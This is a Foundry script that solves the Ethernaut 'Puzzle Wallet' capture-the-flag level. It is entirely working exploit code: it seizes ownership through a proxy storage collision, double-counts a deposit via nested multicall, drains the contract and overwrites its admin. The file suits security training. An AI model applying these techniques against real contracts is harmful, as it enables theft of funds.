// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {PuzzleWallet, PuzzleProxy} from "src/24/PuzzleWallet.sol";
import {PuzzleWalletFactory} from "src/24/PuzzleWalletFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract PuzzleWalletExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL24_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new PuzzleWalletFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        PuzzleWallet instanceContract = PuzzleWallet(instance);
        PuzzleProxy(instance).proposeNewAdmin(msg.sender);
        instanceContract.addToWhitelist(msg.sender);

        bytes[] memory data = new bytes[](2);
        bytes[] memory multiCallData = new bytes[](1);
        data[0] = abi.encodeWithSelector(instanceContract.deposit.selector);
        multiCallData[0] = abi.encodeWithSelector(instanceContract.deposit.selector);
        data[1] = abi.encodeWithSelector(instanceContract.multicall.selector, multiCallData);

        instanceContract.multicall{value: 0.001 ether}(data);

        instanceContract.execute(msg.sender, instance.balance, "");
        instanceContract.setMaxBalance(uint256(uint160(msg.sender)));


        vm.stopPrank();



        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

